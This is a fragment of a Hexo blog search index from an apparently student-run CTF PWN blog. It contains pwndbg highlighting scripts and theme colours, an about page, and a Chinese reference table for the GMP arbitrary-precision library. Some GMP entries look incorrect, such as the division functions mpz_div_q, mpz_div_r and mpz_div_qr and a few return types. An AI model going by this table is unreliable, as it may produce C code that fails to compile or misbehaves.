  console.log(`✅ Pwndbg 高亮生效：${codeBlocks.length} 个代码块`);
}

// 延迟 300ms 执行，确保 Hexo 和主题加载完成
setTimeout(initPwndbgHighlight, 300);

// 明暗模式切换刷新
window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function() {
  location.reload();
});]]></content>
  </entry>
  <entry>
    <title>tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[
CTF
PWN
Math
]]></content>
  </entry>
  <entry>
    <title>about</title>
    <url>/about/index.html</url>
    <content><![CDATA[
关于作者
本人是25级的网络空间安全专业的学生
正在学习CTF PWN
文章内容参考了很多大佬的文章
想要联系可以使用：astarandadream@qq.com
不一定能及时回复
]]></content>
  </entry>
  <entry>
    <title>CvoidExtendLearning</title>
    <url>/unpublic/CvoidExtendLearning.html</url>
    <content><![CDATA[gmp
一、整数类型（mpz_t）—— 最常用
mpz_t 用于任意精度整数运算，函数前缀为 mpz_。
1. 初始化与释放








函数
功能描述
示例




void mpz_init(mpz_t x)
初始化变量 x，初始值为 0
mpz_t a; mpz_init(a);


void mpz_init2(mpz_t x, unsigned long n)
初始化 x 并预分配 n 位存储空间
mpz_init2(a, 1024);（支持 1024 位整数）


void mpz_clear(mpz_t x)
释放 x 占用的内存（必须调用）
mpz_clear(a);


void mpz_inits(mpz_t x, ...)
同时初始化多个变量（以 NULL 结尾）
mpz_inits(a, b, c, NULL);



2. 赋值操作








函数
功能描述
示例




void mpz_set(mpz_t rop, const mpz_t op)
将 op 的值赋给 rop（rop = op）
mpz_set(a, b);（a 等于 b）


void mpz_set_ui(mpz_t rop, unsigned long op)
用无符号整数 op 赋值给 rop
mpz_set_ui(a, 123);（a = 123）


void mpz_set_si(mpz_t rop, long op)
用有符号整数 op 赋值给 rop
mpz_set_si(a, -456);（a = -456）


int mpz_set_str(mpz_t rop, const char *str, int base)
用字符串 str 按 base 进制赋值（base 2-62 或 0，0 表示自动识别）
mpz_set_str(a, "123abc", 16);（16 进制字符串赋值）



3. 算术运算








函数
功能描述
示例




void mpz_add(mpz_t rop, const mpz_t op1, const mpz_t op2)
加法：rop = op1 + op2
mpz_add(c, a, b);


void mpz_sub(mpz_t rop, const mpz_t op1, const mpz_t op2)
减法：rop = op1 - op2
mpz_sub(c, a, b);


void mpz_mul(mpz_t rop, const mpz_t op1, const mpz_t op2)
乘法：rop = op1 * op2
mpz_mul(c, a, b);


void mpz_div_q(mpz_t rop, const mpz_t op1, const mpz_t op2)
除法（商）：rop = op1 / op2（向 0 取整）
mpz_div_q(q, a, b);（q 为商）


void mpz_div_r(mpz_t rop, const mpz_t op1, const mpz_t op2)
除法（余数）：rop = op1 % op2
mpz_div_r(r, a, b);（r 为余数）


void mpz_div_qr(mpz_t q, mpz_t r, const mpz_t n, const mpz_t d)
同时求商和余数：n = q*d + r
mpz_div_qr(q, r, a, b);


void mpz_mod(mpz_t rop, const mpz_t op1, const mpz_t op2)
模运算：rop = op1 mod op2（同余数）
mpz_mod(r, a, b);


void mpz_pow_ui(mpz_t rop, const mpz_t base, unsigned long exp)
幂运算：rop = base^exp（指数为无符号整数）
mpz_pow_ui(c, a, 5);（a^5）


void mpz_neg(mpz_t rop, const mpz_t op)
取反：rop = -op
mpz_neg(b, a);（b = -a）



4. 比较操作








函数
功能描述
示例




int mpz_cmp(const mpz_t op1, const mpz_t op2)
比较 op1 和 op2：返回 &gt;0（op1&gt;op2）、0（相等）、&lt;0（op1&lt;op2）
if (mpz_cmp(a, b) &gt; 0) { ... }


int mpz_cmp_ui(const mpz_t op1, unsigned long op2)
比较 op1 和无符号整数 op2
mpz_cmp_ui(a, 100);


int mpz_cmp_si(const mpz_t op1, long op2)
比较 op1 和有符号整数 op2
mpz_cmp_si(a, -50);



5. 输入输出








函数
功能描述
示例




size_t mpz_out_str(FILE *stream, int base, const mpz_t op)
输出 op 到文件流 stream（base 进制）
mpz_out_str(stdout, 10, a);（ stdout 输出 10 进制）


int mpz_inp_str(mpz_t rop, FILE *stream, int base)
从文件流读取字符串赋值给 rop
mpz_inp_str(a, stdin, 10);（从 stdin 读 10 进制）


int gmp_printf(const char *fmt, ...)
GMP 专用格式化输出（支持 %Zd 等）
gmp_printf("a = %Zd\n", a);


int gmp_scanf(const char *fmt, ...)
GMP 专用格式化输入
gmp_scanf("输入a: %Zd", a);



二、有理数类型（mpq_t）—— 分数运算
mpq_t 用于任意精度有理数（分数）运算，自动约分，函数前缀为 mpq_。
1. 初始化与释放



函数
功能描述
示例




void mpq_init(mpq_t q)
初始化分数 q（默认 0/1）
mpq_t q; mpq_init(q);


void mpq_clear(mpq_t q)
释放 q 的内存
mpq_clear(q);



2. 赋值与分子分母操作








函数
功能描述
示例




void mpq_set(mpq_t rop, const mpq_t op)
赋值：rop = op
mpq_set(a, b);


void mpq_set_ui(mpq_t rop, unsigned long num, unsigned long den)
用分子 num、分母 den 赋值（自动约分）
mpq_set_ui(q, 2, 4);（结果为 1/2）


void mpq_set_num(mpq_t q, const mpz_t num)
设置分子（需手动调用 mpq_canonicalize 约分）
mpq_set_num(q, a);（a 是 mpz_t 变量）


void mpq_set_den(mpq_t q, const mpz_t den)
设置分母（需为正，自动转为正数）
mpq_set_den(q, b);


mpz_t *mpq_numref(const mpq_t q)
获取分子的指针（可直接操作）
mpz_t *num = mpq_numref(q);


mpz_t *mpq_denref(const mpq_t q)
获取分母的指针（可直接操作）
mpz_t *den = mpq_denref(q);


void mpq_canonicalize(mpq_t q)
约分（确保分母为正，分子分母互质）
mpq_canonicalize(q);



3. 算术运算








函数
功能描述
示例




void mpq_add(mpq_t rop, const mpq_t op1, const mpq_t op2)
加法：rop = op1 + op2
mpq_add(c, a, b);


void mpq_sub(mpq_t rop, const mpq_t op1, const mpq_t op2)
减法：rop = op1 - op2
mpq_sub(c, a, b);


void mpq_mul(mpq_t rop, const mpq_t op1, const mpq_t op2)
乘法：rop = op1 * op2
mpq_mul(c, a, b);


void mpq_div(mpq_t rop, const mpq_t op1, const mpq_t op2)
除法：rop = op1 / op2
mpq_div(c, a, b);



三、浮点数类型（mpf_t）—— 高精度小数
mpf_t 用于任意精度浮点数运算，精度可自定义，函数前缀为 mpf_。
1. 初始化与精度设置








函数
功能描述
示例




void mpf_init(mpf_t x)
初始化浮点数 x（默认精度 64 位）
mpf_t f; mpf_init(f);


void mpf_init2(mpf_t x, unsigned long n)
初始化 x 并设置精度为 n 位（二进制位）
mpf_init2(f, 1024);（1024 位精度）


void mpf_set_default_prec(unsigned long n)
设置后续初始化变量的默认精度
mpf_set_default_prec(2048);


void mpf_clear(mpf_t x)
释放 x 的内存
mpf_clear(f);



2. 赋值与运算








函数
功能描述
示例




void mpf_set(mpf_t rop, const mpf_t op)
赋值：rop = op
mpf_set(a, b);


void mpf_set_d(mpf_t rop, double op)
用 double 赋值给 rop
mpf_set_d(f, 3.14159);


void mpf_set_ui(mpf_t rop, unsigned long op)
用无符号整数赋值
mpf_set_ui(f, 123);


void mpf_add(mpf_t rop, const mpf_t op1, const mpf_t op2)
加法：rop = op1 + op2
mpf_add(c, a, b);


void mpf_mul(mpf_t rop, const mpf_t op1, const mpf_t op2)
乘法：rop = op1 * op2
mpf_mul(c, a, b);


void mpf_div(mpf_t rop, const mpf_t op1, const mpf_t op2)
除法：rop = op1 / op2
mpf_div(c, a, b);


void mpf_sqrt(mpf_t rop, const mpf_t op)
平方根：rop = sqrt(op)
mpf_sqrt(f, a);



四、通用工具函数








函数
功能描述
适用类型




size_t mpz_sizeinbase(const mpz_t op, int base)
计算 op 在 base 进制下的位数（不含符号）
mpz_t


int mpz_probab_prime_p(const mpz_t n, int reps)
检测 n 是否为素数（reps 为 Miller-Rabin 测试次数，建议≥5）
mpz_t


void mpz_gcd(mpz_t rop, const mpz_t op1, const mpz_t op2)
最大公约数：rop = gcd(op1, op2)
mpz_t


void mpz_lcm(mpz_t rop, const mpz_t op1, const mpz_t op2)
最小公倍数：rop = lcm(op1, op2)
mpz_t



五、格式符对照表
使用 gmp_printf/gmp_scanf 时，需匹配对应类型的格式符：



数据类型
格式符
示例




mpz_t
%Zd
gmp_printf("a = %Zd\n", a);


mpq_t
%Qd
gmp_printf("q = %Qd\n", q);


mpf_t
%Ff
gmp_printf("f = %Ff\n", f);



]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/js/pwndbg-config.js</url>
    <content><![CDATA[window.pwndbgTheme = {
  register: '#e15050',
  registerValue: '#f1fa8c',
  address: '#ff79c6',
  offset: '#bd93f9',
  instruction: '#50fa7b',
  string: '#f1fa8c',
  comment: '#6272a4',
  command: '#8be9fd',
  symbol: '#f8f8f2',
  index: '#ffb86c',
  function: '#8be9fd',
  background: { light: '#ffffff', dark: '#282a36' },
  text: { light: '#282a36', dark: '#f8f8f2' }
};]]></content>
  </entry>
</search>
